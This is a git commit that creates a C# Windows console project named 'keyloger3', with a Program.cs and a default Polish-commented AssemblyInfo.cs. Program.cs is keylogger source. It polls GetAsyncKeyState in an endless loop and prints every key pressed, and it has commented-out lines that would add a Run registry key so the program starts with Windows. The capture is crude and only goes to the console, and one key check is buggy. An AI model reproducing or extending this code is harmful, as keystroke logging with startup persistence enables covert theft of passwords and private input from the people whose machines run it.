1087c400e4e8d735045c99a6c66711c8a8662b17
dokun botun <dominikr888@interia.eu>
2020-04-16 17:37:10 +0200

    First Commit

---
+++ keyloger3/keyloger3/Program.cs
@@ -0,0 +1,81 @@
+﻿using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+
+
+namespace keyloger3
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+
+        static void Main(string[] args)
+        {
+           // RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+
+           // reg.SetValue("A_P_K_A", @"");
+
+            while (true)
+            {
+                Thread.Sleep(60);
+
+                for (int i = 0; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+
+                    if (keyState != 0)
+                    {
+
+
+                        if (i == 20)
+                        {
+                            Console.Write("capslock");
+                        }
+
+                        if (i == 9)
+                        {
+                            Console.Write("tab");
+                        }
+
+                        if (i == 16)
+                        {
+                            Console.Write("shift");
+                        }
+
+                        if (i == 17)
+                        {
+                            Console.Write("ctrl");
+                        }
+
+                        if (i == 8)
+                        {
+                            Console.Write( "backspace");
+                        }
+
+                        if (i == 18)
+                        {
+                            Console.Write("alt");
+                        }
+
+                        if (keyState == 91)
+                        {
+                            Console.Write("windows");
+                        }
+                        
+                       
+                            Console.Write((char)i + ",");
+                        
+                    }
+                }
+
+            }
+        }
+    }
+}
---
+++ keyloger3/keyloger3/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// Ogólne informacje o zestawie są kontrolowane poprzez następujący 
+// zestaw atrybutów. Zmień wartości tych atrybutów, aby zmodyfikować informacje
+// powiązane z zestawem.
+[assembly: AssemblyTitle("keyloger3")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("keyloger3")]
+[assembly: AssemblyCopyright("Copyright ©  2020")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Ustawienie elementu ComVisible na wartość false sprawia, że typy w tym zestawie są niewidoczne
+// dla składników COM. Jeśli potrzebny jest dostęp do typu w tym zestawie z
+// COM, ustaw wartość true dla atrybutu ComVisible tego typu.
+[assembly: ComVisible(false)]
+
+// Następujący identyfikator GUID jest identyfikatorem biblioteki typów w przypadku udostępnienia tego projektu w modelu COM
+[assembly: Guid("cab5bc68-13c3-4aaa-9425-dd67561650b6")]
+
+// Informacje o wersji zestawu zawierają następujące cztery wartości:
+//
+//      Wersja główna
+//      Wersja pomocnicza
+//      Numer kompilacji
+//      Rewizja
+//
+// Możesz określić wszystkie wartości lub użyć domyślnych numerów kompilacji i poprawki
+// przy użyciu symbolu „*”, tak jak pokazano poniżej:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
